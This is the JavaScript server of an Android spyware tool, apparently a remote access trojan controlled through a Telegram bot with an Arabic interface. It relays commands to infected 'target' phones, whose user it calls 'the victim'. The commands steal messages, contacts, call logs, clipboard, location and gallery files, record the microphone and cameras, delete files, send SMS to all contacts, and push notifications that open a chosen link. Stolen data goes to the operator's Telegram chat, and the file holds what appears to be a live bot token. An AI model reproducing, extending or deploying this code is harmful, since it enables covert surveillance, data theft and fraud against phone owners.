const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

const token = '8920209647:AAFR2RADn3B4vT0AZQhav-GsPlxXQc4F6s4';
const id = '5043599222';
const address = 'https://www.google.com';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم تشغيل الخادم بنجاح</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من جهاز <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"});
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• موقع من جهاز <b>${req.headers.model}</b>`, {parse_mode: "HTML"});
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    });
    appBot.sendMessage(id,
        `°• جهاز جديد متصل\n\n` +
        `• طراز الجهاز: <b>${model}</b>\n` +
        `• البطارية: <b>${battery}</b>\n` +
        `• إصدار الأندرويد: <b>${version}</b>\n` +
        `• سطوع الشاشة: <b>${brightness}</b>\n` +
        `• مزود الخدمة: <b>${provider}</b>`,
        {parse_mode: "HTML"}
    );
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• الجهاز تم فصله\n\n` +
            `• طراز الجهاز: <b>${model}</b>\n` +
            `• البطارية: <b>${battery}</b>\n` +
            `• إصدار الأندرويد: <b>${version}</b>\n` +
            `• سطوع الشاشة: <b>${brightness}</b>\n` +
            `• مزود الخدمة: <b>${provider}</b>`,
            {parse_mode: "HTML"}
        );
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• الرجاء الرد بالرقم الذي تريد إرسال الرسالة القصيرة إليه')) {
            currentNumber = message.text;
            appBot.sendMessage(id,
                `°• عظيم، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم\n\n` +
                `• كن حذرًا، الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك أكثر من المسموح`,
                {reply_markup: {force_reply: true}}
            );
        }
        if (message.reply_to_message.text.includes('°• عظيم، الآن أدخل الرسالة التي تريد إرسالها إلى هذا الرقم')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`);
                }
            });
            currentNumber = '';
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال')) {
            const message_to_all = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد تنزيله')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل مسار الملف الذي تريد حذفه')) {
            const path = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الميكروفون خلالها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل الكاميرا الرئيسية خلالها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل المدة التي تريد تسجيل كاميرا السيلفي خلالها')) {
            const duration = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف')) {
            const toastMessage = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل الرسالة التي تريد أن تظهر كإشعار')) {
            const notificationMessage = message.text;
            currentTitle = notificationMessage;
            appBot.sendMessage(id,
                `°• عظيم، الآن أدخل الرابط الذي تريد فتحه عند النقر على الإشعار\n\n` +
                `• عندما ينقر الضحية على الإشعار، سيتم فتح الرابط الذي أدخلته`,
                {reply_markup: {force_reply: true}}
            );
        }
        if (message.reply_to_message.text.includes('°• عظيم، الآن أدخل الرابط الذي تريد فتحه عند النقر على الإشعار')) {
            const link = message.text;
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.reply_to_message.text.includes('°• أدخل رابط الصوت الذي تريد تشغيله')) {
            const audioLink = message.text;
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`);
                }
            });
            currentUuid = '';
            appBot.sendMessage(id,
                `°• طلبك قيد المعالجة\n\n` +
                `• ستتلقى ردًا خلال لحظات`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                `°• مرحبًا بك في لوحة التحكم\n\n` +
                `• إذا كان التطبيق مثبتًا على الجهاز المستهدف، انتظر الاتصال\n\n` +
                `• عندما تتلقى رسالة الاتصال، فهذا يعني أن الجهاز المستهدف متصل وجاهز لاستقبال الأوامر\n\n` +
                `• اضغط على زر الأوامر واختر الجهاز المطلوب، ثم اختر الأمر المرغوب من بين الأوامر المتاحة\n\n` +
                `• إذا واجهت أي مشكلة في البوت، أرسل الأمر /start`,
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                        resize_keyboard: true
                    }
                }
            );
        }
        if (message.text == 'الأجهزة المتصلة') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `°• لا توجد أجهزة متصلة متاحة\n\n` +
                    `• تأكد من تثبيت التطبيق على الجهاز المستهدف`
                );
            } else {
                let text = `°• قائمة الأجهزة المتصلة:\n\n`;
                appClients.forEach(function (value, key, map) {
                    text += `• طراز الجهاز: <b>${value.model}</b>\n` +
                        `• البطارية: <b>${value.battery}</b>\n` +
                        `• إصدار الأندرويد: <b>${value.version}</b>\n` +
                        `• سطوع الشاشة: <b>${value.brightness}</b>\n` +
                        `• مزود الخدمة: <b>${value.provider}</b>\n\n`;
                });
                appBot.sendMessage(id, text, {parse_mode: "HTML"});
            }
        }
        if (message.text == 'تنفيذ الأوامر') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    `°• لا توجد أجهزة متصلة متاحة\n\n` +
                    `• تأكد من تثبيت التطبيق على الجهاز المستهدف`
                );
            } else {
                const deviceListKeyboard = [];
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: `device:${key}`
                    }]);
                });
                appBot.sendMessage(id, `°• اختر الجهاز لتنفيذ الأمر`, {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                });
            }
        }
    } else {
        appBot.sendMessage(id, `°• تم رفض الإذن`);
    }
});

appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];
    console.log(uuid);
    if (commend == 'device') {
        appBot.editMessageText(`°• اختر الأمر للجهاز: <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'التطبيقات', callback_data: `apps:${uuid}`},
                        {text: 'معلومات الجهاز', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'جلب ملف', callback_data: `file:${uuid}`},
                        {text: 'حذف ملف', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'الحافظة', callback_data: `clipboard:${uuid}`},
                        {text: 'الميكروفون', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'الكاميرا الرئيسية', callback_data: `camera_main:${uuid}`},
                        {text: 'كاميرا السيلفي', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'الموقع', callback_data: `location:${uuid}`},
                        {text: 'إشعار توست', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'المكالمات', callback_data: `calls:${uuid}`},
                        {text: 'جهات الاتصال', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'الاهتزاز', callback_data: `vibrate:${uuid}`},
                        {text: 'إظهار إشعار', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'الرسائل', callback_data: `messages:${uuid}`},
                        {text: 'إرسال رسالة', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'تشغيل صوت', callback_data: `play_audio:${uuid}`},
                        {text: 'إيقاف الصوت', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'إرسال رسالة إلى جميع جهات الاتصال',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        });
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• طلبك قيد المعالجة\n\n` +
            `• ستتلقى ردًا خلال لحظات`,
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ الأوامر"]],
                    resize_keyboard: true
                }
            }
        );
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• الرجاء الرد بالرقم الذي تريد إرسال الرسالة القصيرة إليه\n\n` +
            `• إذا كنت تريد إرسال رسالة إلى أرقام محلية، يمكنك إدخال الرقم مع الصفر في البداية، وإلا أدخل الرقم مع رمز الدولة`,
            {reply_markup: {force_reply: true}}
        );
        currentUuid = uuid;
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل الرسالة التي تريد إرسالها إلى جميع جهات الاتصال\n\n` +
            `• كن حذرًا، الرسالة لن تُرسل إذا كان عدد الأحرف في رسالتك أكثر من المسموح`,
            {reply_markup: {force_reply: true}}
        );
        currentUuid = uuid;
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل مسار الملف الذي تريد تنزيله\n\n` +
            `• لا حاجة لإدخال المسار الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b>DCIM/Camera</b> لتلقي ملفات المعرض`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل مسار الملف الذي تريد حذفه\n\n` +
            `• لا حاجة لإدخال المسار الكامل، فقط أدخل المسار الرئيسي. على سبيل المثال، أدخل <b>DCIM/Camera</b> لحذف ملفات المعرض`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل المدة التي تريد تسجيل الميكروفون خلالها\n\n` +
            `• لاحظ أنه يجب إدخال الوقت رقميًا بوحدة الثواني`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل الرسالة التي تريد أن تظهر على الجهاز المستهدف\n\n` +
            `• التوست هو رسالة قصيرة تظهر على شاشة الجهاز لبضع ثوان`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل الرسالة التي تريد أن تظهر كإشعار\n\n` +
            `• ستظهر رسالتك في شريط حالة الجهاز المستهدف كإشعار عادي`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id);
        appBot.sendMessage(id,
            `°• أدخل رابط الصوت الذي تريد تشغيله\n\n` +
            `• لاحظ أنه يجب إدخال الرابط المباشر للصوت المطلوب، وإلا لن يتم تشغيل الصوت`,
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        );
        currentUuid = uuid;
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping');
    });
    try {
        axios.get(address).then(r => "");
    } catch (e) {
    }
}, 5000);

appServer.listen(process.env.PORT || 8999);
